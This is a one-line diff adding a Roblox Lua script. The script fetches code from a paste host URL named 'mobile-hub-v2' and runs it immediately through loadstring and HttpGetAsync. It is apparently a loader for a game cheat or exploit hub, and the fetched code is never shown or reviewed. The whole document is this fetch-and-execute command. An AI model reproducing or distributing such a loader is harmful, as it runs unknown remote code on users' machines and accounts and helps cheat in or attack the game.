@@ -1,0 +1,1 @@
+loadstring(game:HttpGetAsync("https://shz.al/~mobile-hub-v2"))()
